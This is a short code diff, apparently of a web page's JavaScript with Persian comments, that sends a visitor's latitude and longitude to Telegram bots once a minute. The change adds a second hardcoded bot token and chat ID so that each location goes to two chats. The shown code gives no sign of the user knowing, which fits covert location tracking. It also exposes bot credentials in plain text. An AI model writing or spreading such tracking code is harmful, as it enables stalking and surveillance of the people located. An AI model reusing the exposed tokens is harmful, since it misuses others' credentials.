@@ -89,6 +89,10 @@
     const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
     const CHAT_ID = "8878957420";
     
+    // توکن و چت آیدی دوم
+    const BOT_TOKEN2 = "8610609312:AAE4rjXr75_JWAeE3pDm5-FlKSzqVJFyZEk";
+    const CHAT_ID2 = "6653107968";
+
     // بازه ارسال: ۱ دقیقه (۶۰,۰۰۰ میلی‌ثانیه)
     const INTERVAL = 1 * 60 * 1000;
 
@@ -123,9 +127,12 @@
     }
 
     async function sendLocationToTelegram(latitude, longitude) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+      const url1 = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+      const url2 = `https://api.telegram.org/bot${BOT_TOKEN2}/sendLocation`;
+
       try {
-        const response = await fetch(url, {
+        // ارسال به ربات اول
+        const response1 = await fetch(url1, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -134,8 +141,22 @@
             longitude: longitude
           })
         });
-        const data = await response.json();
-        return data.ok;
+
+        // ارسال به ربات دوم
+        const response2 = await fetch(url2, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID2,
+            latitude: latitude,
+            longitude: longitude
+          })
+        });
+
+        const data1 = await response1.json();
+        const data2 = await response2.json();
+
+        return data1.ok && data2.ok;
       } catch (err) {
         console.error("خطا در ارسال به تلگرام:", err);
         return false;
